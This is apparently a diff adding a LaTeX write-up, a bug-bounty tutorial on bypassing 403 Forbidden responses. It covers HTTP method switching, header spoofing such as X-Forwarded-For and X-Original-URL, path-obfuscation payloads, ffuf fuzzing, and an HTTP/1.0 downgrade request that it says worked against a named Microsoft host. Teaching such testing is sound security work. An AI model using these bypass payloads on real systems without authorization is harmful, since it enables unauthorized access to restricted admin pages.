@@ -1,0 +1,268 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+
+% Page layout adjustments
+\addtolength{\oddsidemargin}{-.5in}
+\addtolength{\evensidemargin}{-.5in}
+\addtolength{\textwidth}{1in}
+\addtolength{\topmargin}{-.5in}
+\addtolength{\textheight}{1in}
+
+\begin{document}
+
+\section*{How I Bypassed 403 Forbidden \& Accessed Restricted Pages}
+
+\subsection*{Introduction}
+A 403 Forbidden error is often seen as a dead end, but in security testing, it is frequently a sign of a misconfigured gateway or Web Application Firewall (WAF). By using specific bypass techniques, ethical hackers can often access restricted administrative panels and sensitive directories.
+
+\subsection*{What is a 403 Forbidden Error?}
+A 403 error occurs when the server understands the request but refuses to fulfill it. 
+
+
+
+\noindent \textbf{Common Causes:}
+\begin{itemize}
+    \item \textbf{IP Restrictions:} Access is limited to specific internal IP ranges.
+    \item \textbf{WAF Rules:} A firewall identifies the request as "suspicious" and blocks it.
+    \item \textbf{Permission Misconfiguration:} Incorrectly set file or directory permissions.
+\end{itemize}
+
+\subsection*{Successful Bypass Techniques}
+
+\subsubsection*{1. Alternative HTTP Methods}
+Security filters often only restrict the \texttt{GET} method. Changing the request method can bypass the filter while still triggering the desired backend logic.
+
+\begin{verbatim}
+curl -X POST https://target.com/admin
+curl -X HEAD https://target.com/admin
+\end{verbatim}
+\textit{Tip: Always test with \texttt{OPTIONS, TRACE, PUT,} or \texttt{PATCH}.}
+
+\subsubsection*{2. Modifying Request Headers}
+Many WAFs look at headers to determine if a request is coming from a trusted local source or a specific proxy.
+
+\begin{itemize}
+    \item \textbf{Spoofing Localhost:}
+    \texttt{curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin}
+    \item \textbf{Spoofing Referer:}
+    \texttt{curl -H "Referer: https://target.com/allowed-page" https://target.com/admin}
+    \item \textbf{Mimicking Crawlers:}
+    \texttt{curl -H "User-Agent: Googlebot" https://target.com/admin}
+\end{itemize}
+
+
+
+\subsubsection*{3. Path Obfuscation Tricks}
+Normalizers on the backend may treat different paths as identical, while the WAF may only look for a specific string match like \texttt{/admin}.
+
+\begin{itemize}
+    \item \textbf{Suffixing:} \texttt{https://target.com/admin/.}
+    \item \textbf{Path Traversal:} \texttt{https://target.com/admin/\%2e\%2e/}
+    \item \textbf{Whitespace/Encoding:} \texttt{https://target.com/admin\%20/}
+\end{itemize}
+
+\subsubsection*{4. Direct IP Access}
+If the 403 restriction is implemented at the Virtual Host level, accessing the server via its direct IP address instead of its domain name can sometimes bypass the restriction entirely.
+\begin{verbatim}
+curl http://192.168.1.1/admin
+\end{verbatim}
+
+\subsubsection*{5. HTTP vs. HTTPS Switching}
+Security rules are sometimes inconsistently applied across protocols. A resource forbidden on HTTPS might be left accessible (or less strictly filtered) over plain HTTP.
+
+\begin{verbatim}
+curl -k http://target.com/admin
+curl -k https://target.com/admin
+\end{verbatim}
+
+\section*{Advanced 403 Forbidden Bypass Techniques}
+
+\subsection*{1. Applying Special Characters to the URL}
+Adding special characters to the URL path can trick the server into interpreting the request differently, often bypassing string-matching security filters.
+
+
+
+\begin{itemize}
+    \item \textbf{Dot Segments:} Use \texttt{/admin/./} or \texttt{/admin\%2e/} to represent the current directory.
+    \item \textbf{Trailing Slashes:} Appending a slash (e.g., \texttt{/admin/}) can bypass rules that look for an exact string match without the slash.
+    \item \textbf{Encoding:} Use encoded representations like \texttt{\%20} (space) to alter the signature of the path.
+\end{itemize}
+\textit{Note: Always test payloads on isolated systems to avoid unintended consequences.}
+
+\subsection*{2. Headers Manipulation}
+Altering or injecting specific HTTP headers can trick the server into believing the request originated from a trusted internal source.
+
+
+
+\begin{itemize}
+    \item \textbf{Internal IP Injection:} Use headers like \texttt{X-Forwarded-For}, \texttt{X-Originating-IP}, or \texttt{X-Remote-IP}.
+    \item \textbf{Trusted Values:} Experiment with \texttt{127.0.0.1}, \texttt{localhost}, or internal cloud IP ranges (e.g., \texttt{10.0.0.1}).
+\end{itemize}
+
+\subsection*{3. Changing IP Address or Using a VPN}
+Restrictions are often tied to the reputation of an IP address. Web Application Firewalls (WAFs) may block IPs flagged for suspicious activity.
+\begin{itemize}
+    \item \textbf{VPNs:} Use services like \textbf{NordVPN} to quickly rotate your exit IP.
+    \item \textbf{ProxyChains:} Useful for chaining multiple proxies to evade IP-based rate limiting.
+\end{itemize}
+
+\subsection*{4. Fuzzing HTTP Methods}
+Fuzzing involves systematically testing an endpoint with various HTTP methods to identify unexpected server behavior.
+
+\medskip
+\noindent \textbf{Testing with FFUF:}
+\begin{verbatim}
+ffuf -u https://example.com/endpoint -X FUZZ -w http_methods_wordlist.txt
+\end{verbatim}
+Replace \texttt{FUZZ} with methods such as \texttt{OPTIONS, PATCH, TRACE}, etc.
+
+\subsection*{5. Fuzzing the URL Path}
+Automated fuzzing can uncover misconfigurations in path validation logic by testing hundreds of URL variations.
+
+
+
+\medskip
+\noindent \textbf{Example Payload Test:}
+\begin{verbatim}
+curl https://example.com/admin/./
+\end{verbatim}
+This is highly effective against logic that fails to properly normalize the path before applying security checks.
+
+\section*{Supplementary 403/401 Bypass Methodology}
+
+\subsection*{Distinguishing 401 Unauthorized vs. 403 Forbidden}
+Understanding the specific error code is critical for selecting the correct bypass vector.
+
+
+
+\begin{itemize}
+    \item \textbf{401 Unauthorized:} The request lacks valid authentication credentials. This is an "Identity" issue. The server is asking for a login or a valid token.
+    \item \textbf{403 Forbidden:} The server understands the identity (or lack thereof) but refuses access based on permissions or security policies. This is an "Authorization" or "Policy" issue.
+\end{itemize}
+
+\subsection*{1. Advanced URL Manipulation \& Case Sensitivity}
+Servers running on Windows (IIS) or specific configurations of Apache/Nginx may handle case sensitivity and path segments inconsistently.
+
+\noindent \textbf{Unique Path Variations:}
+\begin{itemize}
+    \item \textbf{Case Flipping:} \texttt{/Admin}, \texttt{/AdMin}, or \texttt{/ADMIN} (Effective if the WAF is case-sensitive but the backend is not).
+    \item \textbf{Semicolon Injection:} \texttt{/;/admin} or \texttt{//;//admin}.
+    \item \textbf{Path Normalization:} \texttt{/.;/admin} or \texttt{/./admin/..}.
+    \item \textbf{Format Appending:} \texttt{/admin.json} (Tricks the server into thinking it is a public API/static file).
+    \item \textbf{Double Slashes:} \texttt{//admin//}.
+\end{itemize}
+
+\subsection*{2. URL Rewriting \& Routing Headers}
+Some applications use internal routing headers to determine the destination of a request. If the WAF only inspects the main URL but allows these headers, a bypass is possible.
+
+\medskip
+\noindent \textbf{X-Original-URL / X-Rewrite-URL Technique:}
+Instead of requesting the forbidden page directly, request a known public page and tell the application to rewrite the destination internally.
+
+\begin{verbatim}
+GET /anything HTTP/1.1
+Host: target.com
+X-Original-URL: /admin
+
+OR
+
+GET /anything HTTP/1.1
+Host: target.com
+X-Rewrite-URL: /admin
+\end{verbatim}
+
+
+
+\subsection*{3. Parameter Tampering}
+Access controls are sometimes implemented via client-side parameters that can be manipulated in the request.
+
+\begin{itemize}
+    \item \textbf{Boolean Logic:} Change \texttt{isAdmin=false} to \texttt{isAdmin=true}.
+    \item \textbf{View State:} Change \texttt{?view=restricted} to \texttt{?view=public}.
+    \item \textbf{Parameter Removal:} Try removing the parameter entirely to see if the server defaults to an "Allow" state when the restriction variable is missing.
+\end{itemize}
+
+\subsection*{4. Method Overriding via Headers}
+If the server blocks specific HTTP methods but allows header-based overrides, you can trick the backend into executing a forbidden method while the WAF only sees a permitted one.
+
+\begin{verbatim}
+POST /admin HTTP/1.1
+Host: target.com
+X-HTTP-Method-Override: GET
+
+OR
+
+X-HTTP-Override: GET
+\end{verbatim}
+
+\subsection*{5. Strategic Fuzzing Targets}
+While \texttt{/admin} might be blocked, the developers may have forgotten to protect sub-directories. Always fuzz for children of restricted paths:
+\begin{itemize}
+    \item \texttt{/admin/users}
+    \item \texttt{/admin/config}
+    \item \texttt{/admin/settings}
+\end{itemize}
+
+\begin{quote}
+    \textbf{Technique Insight:} Using the \textbf{Param Miner} extension in Burp Suite is highly effective for discovering "hidden" headers like \texttt{X-Original-URL} that the application might be listening for.
+\end{quote}
+
+
+\section*{Protocol Downgrade: Bypassing 403 via HTTP/1.0}
+
+\subsection*{The Vulnerability Concept}
+In modern web traffic, HTTP/1.1 is the standard, requiring a \texttt{Host} header for correct request routing. However, many legacy systems maintain backward compatibility with \textbf{HTTP/1.0}. This can be exploited if a Web Application Firewall (WAF) or security gateway is only configured to validate and filter HTTP/1.1 traffic.
+
+
+
+\subsection*{Real-World Comparison: Microsoft Lyncdiscover Case}
+The following example demonstrates how stripping headers and downgrading the protocol version can trick a server into a "local trust" state, bypassing a 403 Forbidden error.
+
+\medskip
+\noindent \textbf{Initial Request (403 Forbidden):}
+Standard HTTP/1.1 request including all identifying headers.
+\begin{verbatim}
+GET /reach%2fsip.svc HTTP/1.1
+Host: lyncdiscover.microsoft.com
+User-Agent: curl/7.79.1
+Accept: */*
+Connection: close
+\end{verbatim}
+
+\medskip
+\noindent \textbf{Bypass Request (200 OK):}
+The protocol is downgraded to HTTP/1.0 and all header values are cleared.
+\begin{verbatim}
+GET /reach%2fsip.svc HTTP/1.0
+\end{verbatim}
+
+
+
+\subsection*{Why This Works}
+\begin{itemize}
+    \item \textbf{Defaulting to Local:} When the \texttt{Host} header is absent in an HTTP/1.0 request, some misconfigured security mechanisms default the destination address to the server itself.
+    \item \textbf{Identity Masking:} This causes the request to be identified as "local" rather than external, effectively bypassing IP-based or external-access restrictions.
+    \item \textbf{Information Leakage:} This method can also bypass CDNs to obtain original server IPs by observing the \texttt{Location} header in a resulting redirect.
+\end{itemize}
+
+\begin{quote}
+    \textbf{Note:} This specific bypass was validated against \texttt{lyncdiscover.microsoft.com} and resulted in access to restricted \texttt{.svc} files and WSDL documentation.
+\end{quote}
+
+
+\subsection*{Real-World Success Story -1}
+By employing URL fuzzing techniques on a restricted target, I successfully discovered a hidden \textbf{Swagger documentation} endpoint. This discovery allowed for further investigation, eventually leading to the identification of a \textbf{critical SQL injection} vulnerability. This case highlights the power of persistence and creative path manipulation in bypassing 403 restrictions.
+
+\begin{quote}
+    \textbf{Summary:} A 403 error is often just the beginning of a deeper investigation. By combining method switching, header manipulation, and automated fuzzing, you can often find the "hole" in the server's access control logic.
+\end{quote}
+
+
+\subsection*{Real-World Impact -2}
+Bypassing these restrictions is a high-impact finding. In one recent case, identifying a 403 bypass on an admin panel resulted in a \textbf{\$700 Bug Bounty} reward via HackerOne, demonstrating that simple configuration errors can lead to major security risks.
+
+\begin{quote}
+    \textbf{Conclusion:} 403 Forbidden is a challenge, not a wall. By systematically testing methods, headers, and path variations, you can identify the weak points in an application's access control layer.
+\end{quote}
+
+\end{document}
